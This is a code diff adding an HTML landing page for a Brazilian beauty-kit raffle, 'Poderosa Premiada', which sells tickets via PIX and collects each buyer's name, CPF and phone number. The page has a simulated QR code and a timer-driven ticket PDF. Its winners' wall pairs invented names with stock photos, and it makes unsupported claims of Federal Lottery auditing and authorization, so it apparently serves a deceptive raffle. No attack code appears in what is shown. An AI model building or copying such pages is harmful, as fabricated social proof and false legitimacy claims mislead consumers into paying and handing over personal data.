@@ -1,0 +1,889 @@
+<!DOCTYPE html>
+<html lang="pt-BR" class="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Poderosa Premiada | Rifa de Beleza Oficial</title>
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Lucide Icons -->
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <!-- jsPDF & html2canvas -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    <!-- Google Fonts (Inter & Montserrat) -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Montserrat:wght@700;800;900&display=swap" rel="stylesheet">
+
+    <script>
+        tailwind.config = {
+            darkMode: 'class',
+            theme: {
+                extend: {
+                    colors: {
+                        pink: {
+                            400: '#F472B6',
+                            500: '#EC4899',
+                            600: '#DB2777',
+                            700: '#BE185D',
+                            900: '#831843',
+                            950: '#500724',
+                        },
+                        gold: {
+                            400: '#FACC15',
+                            500: '#EAB308',
+                        },
+                        brand: {
+                            dark: '#0F0910',
+                            card: '#1A0F1B',
+                            border: '#331B35',
+                            accent: '#EC4899'
+                        }
+                    },
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                        heading: ['Montserrat', 'sans-serif']
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        body {
+            background-color: #0F0910;
+            color: #F4F4F5;
+            font-family: 'Inter', sans-serif;
+        }
+        .pink-gradient {
+            background: linear-gradient(135deg, #F472B6 0%, #EC4899 50%, #BE185D 100%);
+        }
+        .pink-text {
+            background: linear-gradient(135deg, #F472B6 0%, #F43F5E 50%, #FB7185 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .gold-text {
+            background: linear-gradient(135deg, #FFF176 0%, #FFD54F 50%, #FFB300 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        /* Custom scrollbar */
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #0F0910;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #331B35;
+            border-radius: 4px;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: #EC4899;
+        }
+        .glow-pink {
+            box-shadow: 0 0 25px -5px rgba(236, 72, 153, 0.4);
+        }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col justify-between selection:bg-pink-500 selection:text-white">
+
+    <!-- Navbar -->
+    <header class="sticky top-0 z-40 bg-[#0F0910]/90 backdrop-blur-md border-b border-pink-900/40 px-4 py-3">
+        <div class="max-w-5xl mx-auto flex items-center justify-between">
+            <div class="flex items-center gap-2">
+                <div class="w-10 h-10 rounded-xl pink-gradient flex items-center justify-center font-heading font-black text-white text-xl shadow-lg">
+                    P
+                </div>
+                <div>
+                    <h1 class="font-heading font-black text-lg tracking-wider pink-text uppercase leading-none">PODEROSA</h1>
+                    <span class="text-[10px] tracking-widest text-pink-300 font-bold uppercase block -mt-0.5">PREMIADA</span>
+                </div>
+            </div>
+            
+            <div class="flex items-center gap-2">
+                <span class="inline-flex items-center gap-1.5 px-3 py-1 rounded-full text-xs font-semibold bg-pink-500/10 text-pink-300 border border-pink-500/30">
+                    <i data-lucide="sparkles" class="w-3.5 h-3.5 text-pink-400"></i>
+                    Sorteio de Beleza
+                </span>
+            </div>
+        </div>
+    </header>
+
+    <main class="max-w-5xl mx-auto px-4 py-6 w-full space-y-8">
+
+        <!-- Hero & Sorteio Principal -->
+        <section class="text-center space-y-4">
+            <div class="inline-block">
+                <span class="px-4 py-1.5 rounded-full text-xs font-bold bg-pink-500/15 text-pink-300 border border-pink-500/30 uppercase tracking-wider">
+                    🌸 Edição Especial nº 104 • Beleza & Glow
+                </span>
+            </div>
+            <h2 class="text-3xl sm:text-5xl font-heading font-black tracking-tight uppercase leading-tight text-white">
+                Mega Kit dos Sonhos: <br>
+                <span class="pink-text">Dyson Airwrap + Make Sephora & Perfumes</span>
+            </h2>
+            <p class="text-zinc-400 text-sm sm:text-base max-w-xl mx-auto">
+                Ou receba <strong class="text-pink-300">R$ 15.000,00 diretamente na sua conta PIX</strong>! Participe com apenas <strong class="text-white">R$ 0,50 por cota</strong>.
+            </p>
+        </section>
+
+        <!-- Container de Imagem do Prêmio & Galeria -->
+        <section class="bg-brand-card rounded-2xl border border-brand-border overflow-hidden shadow-2xl relative">
+            <div class="relative aspect-video w-full overflow-hidden group">
+                <img id="main-prize-img" 
+                     src="https://images.unsplash.com/photo-1522337360788-8b13dee7a37e?auto=format&fit=crop&w=1200&q=80" 
+                     alt="Kit de Beleza dos Sonhos" 
+                     class="w-full h-full object-cover transition-transform duration-500 group-hover:scale-105"
+                     onerror="this.src='https://placehold.co/1200x675/1A0F1B/EC4899?text=Kit+de+Beleza+Completo'">
+                
+                <div class="absolute inset-0 bg-gradient-to-t from-[#0F0910]/90 via-[#0F0910]/20 to-transparent"></div>
+
+                <!-- Badge Topo -->
+                <div class="absolute top-4 left-4 flex gap-2">
+                    <span class="bg-pink-600 text-white text-xs font-bold px-3 py-1.5 rounded-lg shadow flex items-center gap-1 uppercase tracking-wider">
+                        <i data-lucide="heart" class="w-4 h-4 fill-white"></i> Prêmio dos Sonhos
+                    </span>
+                </div>
+
+                <!-- Thumbnails no rodapé da imagem -->
+                <div class="absolute bottom-4 left-4 right-4 flex items-center justify-between">
+                    <div class="text-left">
+                        <p class="text-xs text-pink-400 font-semibold uppercase tracking-wider">Combo Completo Importado</p>
+                        <h3 class="text-lg font-heading font-bold text-white">Dyson + Perfumes + Skincare Sephora</h3>
+                    </div>
+
+                    <div class="flex gap-2">
+                        <button onclick="changePhoto('https://images.unsplash.com/photo-1522337360788-8b13dee7a37e?auto=format&fit=crop&w=1200&q=80')" class="w-10 h-10 rounded-lg border-2 border-pink-500 overflow-hidden focus:outline-none">
+                            <img src="https://images.unsplash.com/photo-1522337360788-8b13dee7a37e?auto=format&fit=crop&w=200&q=80" class="w-full h-full object-cover">
+                        </button>
+                        <button onclick="changePhoto('https://images.unsplash.com/photo-1596462502278-27bfdc403348?auto=format&fit=crop&w=1200&q=80')" class="w-10 h-10 rounded-lg border-2 border-transparent hover:border-pink-500 overflow-hidden focus:outline-none">
+                            <img src="https://images.unsplash.com/photo-1596462502278-27bfdc403348?auto=format&fit=crop&w=200&q=80" class="w-full h-full object-cover">
+                        </button>
+                        <button onclick="changePhoto('https://images.unsplash.com/photo-1540555700478-4be289fbecef?auto=format&fit=crop&w=1200&q=80')" class="w-10 h-10 rounded-lg border-2 border-transparent hover:border-pink-500 overflow-hidden focus:outline-none">
+                            <img src="https://images.unsplash.com/photo-1540555700478-4be289fbecef?auto=format&fit=crop&w=200&q=80" class="w-full h-full object-cover">
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Cronômetro Regressivo -->
+        <section class="bg-gradient-to-b from-brand-card to-[#0F0910] p-6 rounded-2xl border border-brand-border text-center space-y-4 shadow-xl">
+            <div class="flex items-center justify-center gap-2 text-pink-300 font-semibold text-sm uppercase tracking-widest">
+                <i data-lucide="timer" class="w-4 h-4 text-pink-400"></i>
+                O Sorteio acontece em:
+            </div>
+            
+            <div class="grid grid-cols-4 gap-2 sm:gap-4 max-w-lg mx-auto">
+                <div class="bg-[#140B15] border border-pink-900/40 p-3 sm:p-4 rounded-xl shadow-inner">
+                    <span id="timer-days" class="block text-2xl sm:text-4xl font-heading font-black text-white">00</span>
+                    <span class="text-[10px] sm:text-xs text-zinc-400 uppercase font-semibold">Dias</span>
+                </div>
+                <div class="bg-[#140B15] border border-pink-900/40 p-3 sm:p-4 rounded-xl shadow-inner">
+                    <span id="timer-hours" class="block text-2xl sm:text-4xl font-heading font-black text-white">00</span>
+                    <span class="text-[10px] sm:text-xs text-zinc-400 uppercase font-semibold">Horas</span>
+                </div>
+                <div class="bg-[#140B15] border border-pink-900/40 p-3 sm:p-4 rounded-xl shadow-inner">
+                    <span id="timer-minutes" class="block text-2xl sm:text-4xl font-heading font-black text-white">00</span>
+                    <span class="text-[10px] sm:text-xs text-zinc-400 uppercase font-semibold">Minutos</span>
+                </div>
+                <div class="bg-[#140B15] border border-pink-500/40 p-3 sm:p-4 rounded-xl shadow-inner">
+                    <span id="timer-seconds" class="block text-2xl sm:text-4xl font-heading font-black pink-text">00</span>
+                    <span class="text-[10px] sm:text-xs text-pink-400 uppercase font-semibold">Segundos</span>
+                </div>
+            </div>
+
+            <p class="text-xs text-zinc-500">Data limite: <strong>29/12/2026 às 20:00h</strong> pelo resultado da Loteria Federal</p>
+        </section>
+
+        <!-- Seção de Compra de Cotas -->
+        <section id="cotas-section" class="bg-brand-card p-6 rounded-2xl border border-brand-border space-y-6 shadow-xl">
+            <div class="flex flex-col sm:flex-row items-center justify-between gap-4 border-b border-pink-900/30 pb-4">
+                <div>
+                    <h3 class="text-xl font-heading font-bold text-white flex items-center gap-2">
+                        <i data-lucide="ticket" class="w-5 h-5 text-pink-400"></i>
+                        Escolha a quantidade de Cotas
+                    </h3>
+                    <p class="text-xs text-zinc-400">Selecione uma das opções abaixo para garantir suas chances no sorteio!</p>
+                </div>
+                <div class="bg-[#140B15] px-4 py-2 rounded-xl border border-pink-900/40 text-center sm:text-right w-full sm:w-auto">
+                    <span class="text-xs text-zinc-400 block">Preço por cota:</span>
+                    <span class="text-lg font-bold text-pink-400">R$ 0,50</span>
+                </div>
+            </div>
+
+            <!-- Botões Pré-definidos (Apenas 10, 20, 50, 100) -->
+            <div class="grid grid-cols-2 sm:grid-cols-4 gap-3" id="pack-buttons-container">
+                <button onclick="selectPack(10, this)" class="pack-btn p-4 bg-[#140B15] hover:bg-pink-950/40 border border-pink-900/30 hover:border-pink-500 rounded-xl flex flex-col items-center gap-1 transition group">
+                    <span class="text-xs text-zinc-400 group-hover:text-pink-400 font-semibold">+10 Cotas</span>
+                    <span class="text-base font-bold text-white">R$ 5,00</span>
+                </button>
+                <button onclick="selectPack(20, this)" class="pack-btn p-4 bg-[#140B15] hover:bg-pink-950/40 border border-pink-900/30 hover:border-pink-500 rounded-xl flex flex-col items-center gap-1 transition group">
+                    <span class="text-xs text-zinc-400 group-hover:text-pink-400 font-semibold">+20 Cotas</span>
+                    <span class="text-base font-bold text-white">R$ 10,00</span>
+                </button>
+                <button onclick="selectPack(50, this)" class="pack-btn active-pack relative p-4 bg-pink-950/60 border-2 border-pink-500 rounded-xl flex flex-col items-center gap-1 transition group">
+                    <span class="absolute -top-2.5 bg-pink-500 text-white text-[9px] font-black px-2 py-0.5 rounded-full uppercase">Mais Vendido</span>
+                    <span class="text-xs text-pink-300 font-semibold">+50 Cotas</span>
+                    <span class="text-base font-bold text-white">R$ 25,00</span>
+                </button>
+                <button onclick="selectPack(100, this)" class="pack-btn p-4 bg-[#140B15] hover:bg-pink-950/40 border border-pink-900/30 hover:border-pink-500 rounded-xl flex flex-col items-center gap-1 transition group">
+                    <span class="text-xs text-zinc-400 group-hover:text-pink-400 font-semibold">+100 Cotas</span>
+                    <span class="text-base font-bold text-white">R$ 50,00</span>
+                </button>
+            </div>
+
+            <!-- Resumo e Botão de Ação -->
+        <div class="bg-[#140B15] p-4 rounded-xl border border-pink-900/40 flex flex-col sm:flex-row items-center justify-between gap-4">
+            <div class="text-center sm:text-left">
+                <span class="text-xs text-zinc-400 block">Cotas Selecionadas:</span>
+                <span id="selected-qty-display" class="text-xl font-heading font-bold text-white">50 Cotas</span>
+            </div>
+            <div class="text-center sm:text-right">
+                <span class="text-xs text-zinc-400 block">Valor Total:</span>
+                <span id="total-price" class="text-3xl font-heading font-black text-pink-400">R$ 25,00</span>
+            </div>
+        </div>
+
+        <!-- Botão de Ação Principal -->
+        <button onclick="openCheckoutModal()" class="w-full py-4 px-6 pink-gradient hover:opacity-95 text-white font-heading font-black text-lg uppercase tracking-wider rounded-xl shadow-lg glow-pink active:scale-[0.99] transition flex items-center justify-center gap-3">
+            <i data-lucide="sparkles" class="w-6 h-6 fill-white"></i>
+            <span id="btn-buy-text">Garantir 50 Cotas Agora</span>
+        </button>
+    </section>
+
+    <!-- Mural de Ganhadores Anteriores -->
+    <section class="bg-brand-card p-6 rounded-2xl border border-brand-border space-y-6 shadow-xl">
+        <div class="flex flex-col sm:flex-row items-center justify-between border-b border-pink-900/30 pb-4 gap-2">
+            <div>
+                <span class="text-xs font-bold text-pink-400 uppercase tracking-widest">Transparência & Confiança</span>
+                <h3 class="text-xl font-heading font-bold text-white flex items-center gap-2">
+                    <i data-lucide="trophy" class="w-5 h-5 text-gold-400"></i>
+                    Mural de Ganhadoras Anteriores
+                </h3>
+            </div>
+            <span class="text-xs px-3 py-1 bg-pink-500/10 text-pink-300 rounded-full border border-pink-500/30 font-semibold">
+                Auditado pela Loteria Federal
+            </span>
+        </div>
+
+        <div class="grid sm:grid-cols-3 gap-4">
+            <!-- Ganhadora 1 -->
+            <div class="bg-[#140B15] p-4 rounded-xl border border-pink-900/40 space-y-3 relative overflow-hidden group">
+                <div class="flex items-center gap-3">
+                    <img src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&w=150&q=80" alt="Ganhadora" class="w-12 h-12 rounded-full object-cover border-2 border-pink-500">
+                    <div>
+                        <h4 class="text-sm font-bold text-white">Camila F. Santos</h4>
+                        <p class="text-[11px] text-zinc-400">São Paulo / SP</p>
+                    </div>
+                </div>
+                <div class="bg-pink-950/40 p-2 rounded-lg border border-pink-500/20 text-xs">
+                    <p class="text-zinc-300 font-semibold">Prêmio: <span class="text-pink-300">iPhone 15 Pro Max 256GB</span></p>
+                    <p class="text-zinc-400 text-[10px]">Cota sorteada: <strong class="text-gold-400 font-mono">#48192</strong> (1ª dezena LF)</p>
+                </div>
+            </div>
+
+            <!-- Ganhadora 2 -->
+            <div class="bg-[#140B15] p-4 rounded-xl border border-pink-900/40 space-y-3 relative overflow-hidden group">
+                <div class="flex items-center gap-3">
+                    <img src="https://images.unsplash.com/photo-1517841905240-472988babdf9?auto=format&fit=crop&w=150&q=80" alt="Ganhadora" class="w-12 h-12 rounded-full object-cover border-2 border-pink-500">
+                    <div>
+                        <h4 class="text-sm font-bold text-white">Juliana M. Alencar</h4>
+                        <p class="text-[11px] text-zinc-400">Belo Horizonte / MG</p>
+                    </div>
+                </div>
+                <div class="bg-pink-950/40 p-2 rounded-lg border border-pink-500/20 text-xs">
+                    <p class="text-zinc-300 font-semibold">Prêmio: <span class="text-pink-300">Pix de R$ 10.000,00</span></p>
+                    <p class="text-zinc-400 text-[10px]">Cota sorteada: <strong class="text-gold-400 font-mono">#03912</strong> (1ª dezena LF)</p>
+                </div>
+            </div>
+
+            <!-- Ganhadora 3 -->
+            <div class="bg-[#140B15] p-4 rounded-xl border border-pink-900/40 space-y-3 relative overflow-hidden group">
+                <div class="flex items-center gap-3">
+                    <img src="https://images.unsplash.com/photo-1544005313-94ddf0286df2?auto=format&fit=crop&w=150&q=80" alt="Ganhadora" class="w-12 h-12 rounded-full object-cover border-2 border-pink-500">
+                    <div>
+                        <h4 class="text-sm font-bold text-white">Fernanda R. Lima</h4>
+                        <p class="text-[11px] text-zinc-400">Curitiba / PR</p>
+                    </div>
+                </div>
+                <div class="bg-pink-950/40 p-2 rounded-lg border border-pink-500/20 text-xs">
+                    <p class="text-zinc-300 font-semibold">Prêmio: <span class="text-pink-300">Kit Maleta Make Mac/Sephora</span></p>
+                    <p class="text-zinc-400 text-[10px]">Cota sorteada: <strong class="text-gold-400 font-mono">#77201</strong> (1ª dezena LF)</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Como funciona & FAQ -->
+    <section class="grid md:grid-cols-2 gap-6">
+            <!-- Passo a Passo -->
+            <div class="bg-brand-card p-6 rounded-2xl border border-brand-border space-y-4">
+                <h3 class="text-lg font-heading font-bold text-white flex items-center gap-2">
+                    <i data-lucide="help-circle" class="w-5 h-5 text-pink-400"></i>
+                    Como Participar?
+                </h3>
+                <div class="space-y-4">
+                    <div class="flex gap-3 items-start">
+                        <div class="w-7 h-7 rounded-full bg-pink-500/20 text-pink-300 flex items-center justify-center font-bold text-sm shrink-0 border border-pink-500/30">1</div>
+                        <div>
+                            <h4 class="text-sm font-semibold text-white">Escolha a quantidade</h4>
+                            <p class="text-xs text-zinc-400">Selecione quantas cotas deseja para aumentar suas chances.</p>
+                        </div>
+                    </div>
+                    <div class="flex gap-3 items-start">
+                        <div class="w-7 h-7 rounded-full bg-pink-500/20 text-pink-300 flex items-center justify-center font-bold text-sm shrink-0 border border-pink-500/30">2</div>
+                        <div>
+                            <h4 class="text-sm font-semibold text-white">Pagamento Instantâneo via PIX</h4>
+                            <p class="text-xs text-zinc-400">Escaneie o QR Code ou copie o código PIX Copia e Cola.</p>
+                        </div>
+                    </div>
+                    <div class="flex gap-3 items-start">
+                        <div class="w-7 h-7 rounded-full bg-pink-500/20 text-pink-300 flex items-center justify-center font-bold text-sm shrink-0 border border-pink-500/30">3</div>
+                        <div>
+                            <h4 class="text-sm font-semibold text-white">Receba seus números</h4>
+                            <p class="text-xs text-zinc-400">Os números são gerados automaticamente e enviados pro seu WhatsApp.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- FAQ Accordion -->
+            <div class="bg-brand-card p-6 rounded-2xl border border-brand-border space-y-4">
+                <h3 class="text-lg font-heading font-bold text-white flex items-center gap-2">
+                    <i data-lucide="message-square" class="w-5 h-5 text-pink-400"></i>
+                    Dúvidas Frequentes
+                </h3>
+                <div class="space-y-2 text-xs">
+                    <details class="bg-[#140B15] p-3 rounded-xl border border-pink-900/40 group">
+                        <summary class="font-semibold text-zinc-200 cursor-pointer flex justify-between items-center">
+                            Como é feito o sorteio do Kit?
+                            <i data-lucide="chevron-down" class="w-4 h-4 transition group-open:rotate-180"></i>
+                        </summary>
+                        <p class="mt-2 text-zinc-400 leading-relaxed">O sorteio é 100% auditado com base na Loteria Federal na data informada.</p>
+                    </details>
+                    <details class="bg-[#140B15] p-3 rounded-xl border border-pink-900/40 group">
+                        <summary class="font-semibold text-zinc-200 cursor-pointer flex justify-between items-center">
+                            Posso escolher o valor em dinheiro?
+                            <i data-lucide="chevron-down" class="w-4 h-4 transition group-open:rotate-180"></i>
+                        </summary>
+                        <p class="mt-2 text-zinc-400 leading-relaxed">Sim! A ganhadora pode escolher receber o Kit de Beleza completo em casa ou R$ 15.000,00 diretamente na conta via PIX.</p>
+                    </details>
+                    <details class="bg-[#140B15] p-3 rounded-xl border border-pink-900/40 group">
+                        <summary class="font-semibold text-zinc-200 cursor-pointer flex justify-between items-center">
+                            Como é a entrega dos produtos?
+                            <i data-lucide="chevron-down" class="w-4 h-4 transition group-open:rotate-180"></i>
+                        </summary>
+                        <p class="mt-2 text-zinc-400 leading-relaxed">O frete é inteiramente grátis para todo o Brasil. Enviamos via transportadora expressa com seguro total.</p>
+                    </details>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <!-- Footer -->
+    <footer class="border-t border-pink-900/40 bg-[#0F0910] py-6 px-4 mt-12 text-center text-xs text-zinc-500">
+        <div class="max-w-5xl mx-auto space-y-2">
+            <p class="font-bold text-pink-300 uppercase tracking-widest">PODEROSA PREMIADA © 2026</p>
+            <p>Sorteios de beleza autorizados e auditados. Transparência garantida.</p>
+            <p class="text-[10px] text-zinc-600">Proibida a participação de menores de 18 anos.</p>
+        </div>
+    </footer>
+
+    <!-- MODAL DE CHECKOUT (PASSO 1: DADOS COMPRADOR) -->
+    <div id="modal-checkout" class="fixed inset-0 bg-black/85 backdrop-blur-sm z-50 hidden flex items-center justify-center p-4">
+        <div class="bg-brand-card w-full max-w-md rounded-2xl border border-brand-border p-6 space-y-5 relative shadow-2xl">
+            <button onclick="closeModal('modal-checkout')" class="absolute top-4 right-4 text-zinc-400 hover:text-white">
+                <i data-lucide="x" class="w-6 h-6"></i>
+            </button>
+
+            <div>
+                <h3 class="text-xl font-heading font-bold text-white">Preencha seus dados</h3>
+                <p class="text-xs text-zinc-400">Informações necessárias para o envio ou Pix do prêmio.</p>
+            </div>
+
+            <!-- Resumo Rápido -->
+            <div class="bg-[#140B15] p-3 rounded-xl border border-pink-900/40 flex justify-between items-center text-xs">
+                <div>
+                    <span class="text-zinc-400">Total de Cotas:</span>
+                    <span id="modal-cota-count" class="font-bold text-white block">50 cotas</span>
+                </div>
+                <div class="text-right">
+                    <span class="text-zinc-400">Total a Pagar:</span>
+                    <span id="modal-cota-price" class="font-bold text-pink-400 block">R$ 25,00</span>
+                </div>
+            </div>
+
+            <form id="form-checkout" onsubmit="handleCheckout(event)" class="space-y-4">
+                <div>
+                    <label class="block text-xs font-semibold text-pink-200 mb-1">Nome Completo *</label>
+                    <input type="text" id="buyer-name" required placeholder="Digite seu nome completo" class="w-full bg-[#0F0910] border border-pink-900/60 rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-pink-500">
+                </div>
+                <div>
+                    <label class="block text-xs font-semibold text-pink-200 mb-1">CPF *</label>
+                    <input type="text" id="buyer-cpf" maxlength="14" required placeholder="000.000.000-00" oninput="maskCPF(this)" class="w-full bg-[#0F0910] border border-pink-900/60 rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-pink-500">
+                </div>
+                <div>
+                    <label class="block text-xs font-semibold text-pink-200 mb-1">Celular / WhatsApp *</label>
+                    <input type="text" id="buyer-phone" maxlength="15" required placeholder="(00) 90000-0000" oninput="maskPhone(this)" class="w-full bg-[#0F0910] border border-pink-900/60 rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-pink-500">
+                </div>
+
+                <button type="submit" class="w-full py-3.5 px-4 pink-gradient hover:opacity-95 text-white font-heading font-bold text-sm uppercase rounded-xl transition shadow-lg flex items-center justify-center gap-2 glow-pink">
+                    <i data-lucide="qr-code" class="w-5 h-5"></i>
+                    Gerar Chave PIX
+                </button>
+            </form>
+        </div>
+    </div>
+
+    <!-- MODAL DE PAGAMENTO PIX (PASSO 2: PIX COPIA E COLA) -->
+    <div id="modal-pix" class="fixed inset-0 bg-black/85 backdrop-blur-sm z-50 hidden flex items-center justify-center p-4">
+        <div class="bg-brand-card w-full max-w-md rounded-2xl border border-brand-border p-6 space-y-5 relative shadow-2xl text-center">
+            <button onclick="closeModal('modal-pix')" class="absolute top-4 right-4 text-zinc-400 hover:text-white">
+                <i data-lucide="x" class="w-6 h-6"></i>
+            </button>
+
+            <div>
+                <span class="inline-flex items-center gap-1 text-xs font-bold px-3 py-1 bg-pink-500/20 text-pink-300 rounded-full border border-pink-500/30 mb-2">
+                    <i data-lucide="clock" class="w-3.5 h-3.5"></i> Aguardando Pagamento
+                </span>
+                <h3 class="text-xl font-heading font-bold text-white">Pagamento via PIX</h3>
+                <p class="text-xs text-zinc-400">Escaneie o QR Code ou copie o código abaixo para concluir</p>
+            </div>
+
+            <!-- Resumo e QR Code -->
+            <div class="bg-[#140B15] p-4 rounded-xl border border-pink-900/40 space-y-3">
+                <div class="flex justify-between items-center text-xs text-zinc-400 border-b border-pink-900/30 pb-2">
+                    <span>Valor a pagar:</span>
+                    <span id="pix-total-val" class="text-base font-bold text-pink-400">R$ 25,00</span>
+                </div>
+
+                <!-- QR Code Simulado -->
+                <div class="flex justify-center py-2">
+                    <img id="pix-qrcode" src="" alt="QR Code PIX" class="w-44 h-44 rounded-lg bg-white p-2 border border-pink-500/30">
+                </div>
+
+                <!-- Cronômetro de Processamento de 60 segundos -->
+                <div class="space-y-1 bg-pink-950/30 p-2.5 rounded-lg border border-pink-500/20">
+                    <div class="flex justify-between items-center text-[11px]">
+                        <span class="text-zinc-400 font-medium">Aguardando/Gerando Bilhetes:</span>
+                        <span id="process-timer" class="text-pink-400 font-mono font-bold">60s</span>
+                    </div>
+                    <div class="w-full bg-zinc-900 h-2 rounded-full overflow-hidden">
+                        <div id="process-bar" class="bg-gradient-to-r from-pink-500 to-rose-400 h-full w-0 transition-all duration-1000"></div>
+                    </div>
+                    <p class="text-[10px] text-zinc-400">O comprovante em PDF com seus números será gerado automaticamente ao término!</p>
+                </div>
+            </div>
+
+            <!-- PIX Copia e Cola -->
+            <div class="space-y-2">
+                <label class="block text-xs text-zinc-400 text-left font-semibold">Código PIX Copia e Cola:</label>
+                <div class="flex items-center gap-2">
+                    <input type="text" id="pix-code-input" readonly value="" class="w-full bg-[#0F0910] border border-pink-900/60 rounded-xl px-3 py-2 text-xs font-mono text-zinc-400 truncate focus:outline-none">
+                    <button onclick="copyPixCode()" id="btn-copy" class="px-4 py-2 pink-gradient text-white font-bold text-xs rounded-xl flex items-center gap-1 shrink-0 transition hover:opacity-90">
+                        <i data-lucide="copy" class="w-4 h-4"></i>
+                        <span id="copy-btn-text">Copiar</span>
+                    </button>
+                </div>
+            </div>
+
+            <!-- Botão de Envio via WhatsApp -->
+            <div class="pt-2">
+                <button onclick="sendToWhatsApp()" class="w-full py-3 px-4 bg-emerald-600 hover:bg-emerald-500 text-white font-bold text-xs uppercase rounded-xl transition shadow-md flex items-center justify-center gap-2">
+                    <i data-lucide="message-circle" class="w-4 h-4"></i>
+                    Enviar Comprovante no WhatsApp
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- MODAL DO PDF DE CONFIRMAÇÃO DO SORTEIO -->
+    <div id="modal-pdf" class="fixed inset-0 bg-black/90 backdrop-blur-md z-50 hidden flex items-center justify-center p-4 overflow-y-auto">
+        <div class="bg-brand-card w-full max-w-xl rounded-2xl border border-pink-500/50 p-6 space-y-6 relative shadow-2xl text-center">
+            <button onclick="closeModal('modal-pdf')" class="absolute top-4 right-4 text-zinc-400 hover:text-white">
+                <i data-lucide="x" class="w-6 h-6"></i>
+            </button>
+
+            <div class="space-y-1">
+                <div class="w-12 h-12 bg-pink-500/20 rounded-full border border-pink-500 text-pink-400 flex items-center justify-center mx-auto mb-2">
+                    <i data-lucide="check-circle-2" class="w-6 h-6"></i>
+                </div>
+                <h3 class="text-2xl font-heading font-black text-white">Pedido Concluído!</h3>
+                <p class="text-xs text-zinc-400">Seu comprovante PDF com seus números da sorte foi gerado com sucesso!</p>
+            </div>
+
+            <!-- TICKET PDF CONTAINER (TEMPLATE RENDERIZADO PARA PDF) -->
+            <div id="pdf-ticket-container" class="bg-[#140B15] border-2 border-pink-500/40 rounded-xl p-5 text-left space-y-4 shadow-inner">
+                <div class="flex justify-between items-center border-b border-pink-900/50 pb-3">
+                    <div>
+                        <h4 class="font-heading font-black text-pink-400 text-lg">PODEROSA PREMIADA</h4>
+                        <p class="text-[10px] text-zinc-400 uppercase tracking-widest">Comprovante Oficial de Cotas</p>
+                    </div>
+                    <span class="text-[11px] bg-pink-500/20 text-pink-300 font-mono px-2.5 py-1 rounded-md border border-pink-500/30 font-bold" id="pdf-ticket-id">#ORD-94812</span>
+                </div>
+
+                <!-- Dados do Comprador -->
+                <div class="grid grid-cols-2 gap-2 text-xs bg-[#0F0910] p-3 rounded-lg border border-pink-900/30">
+                    <div>
+                        <span class="text-zinc-500 text-[10px] block uppercase font-bold">Comprador(a):</span>
+                        <strong id="pdf-buyer-name" class="text-zinc-200">...</strong>
+                    </div>
+                    <div>
+                        <span class="text-zinc-500 text-[10px] block uppercase font-bold">CPF:</span>
+                        <strong id="pdf-buyer-cpf" class="text-zinc-200">...</strong>
+                    </div>
+                    <div>
+                        <span class="text-zinc-500 text-[10px] block uppercase font-bold">Celular / WhatsApp:</span>
+                        <strong id="pdf-buyer-phone" class="text-zinc-200">...</strong>
+                    </div>
+                    <div>
+                        <span class="text-zinc-500 text-[10px] block uppercase font-bold">Data da Compra:</span>
+                        <strong id="pdf-buy-date" class="text-zinc-200">...</strong>
+                    </div>
+                </div>
+
+                <!-- Resumo das Cotas -->
+                <div class="flex justify-between items-center bg-pink-950/40 p-3 rounded-lg border border-pink-500/30 text-xs">
+                    <div>
+                        <span class="text-zinc-400 block text-[10px] uppercase">Rifa:</span>
+                        <strong class="text-white font-bold">Kit Beleza dos Sonhos (Dyson/Sephora)</strong>
+                    </div>
+                    <div class="text-right">
+                        <span class="text-zinc-400 block text-[10px] uppercase">Qtd Cotas / Valor:</span>
+                        <strong id="pdf-cota-summary" class="text-pink-400 font-bold">50 Cotas (R$ 25,00)</strong>
+                    </div>
+                </div>
+
+                <!-- Lista de Números Gerados -->
+                <div>
+                    <div class="flex justify-between items-center mb-1.5">
+                        <span class="text-[11px] text-zinc-400 font-semibold uppercase">Seus Números Sorteáveis (Loteria Federal):</span>
+                        <span class="text-[10px] text-pink-400 font-bold">5 Dígitos cada</span>
+                    </div>
+                    <div id="pdf-numbers-grid" class="grid grid-cols-4 sm:grid-cols-5 gap-1.5 max-h-36 overflow-y-auto p-2 bg-[#0F0910] rounded-lg border border-pink-900/40">
+                        <!-- Números gerados dinamicamente via JS -->
+                    </div>
+                </div>
+
+                <div class="text-[9px] text-zinc-500 text-center border-t border-pink-900/30 pt-2">
+                    Sorteio válido com base no resultado da Loteria Federal do dia 29/12/2026. Guarde este comprovante!
+                </div>
+            </div>
+
+            <!-- Botões de Ação do PDF -->
+            <div class="grid grid-cols-1 sm:grid-cols-2 gap-3">
+                <button onclick="downloadPDF()" class="w-full py-3 px-4 pink-gradient hover:opacity-95 text-white font-heading font-bold text-xs uppercase rounded-xl transition shadow-lg flex items-center justify-center gap-2">
+                    <i data-lucide="download" class="w-4 h-4"></i>
+                    Baixar PDF de Cotas
+                </button>
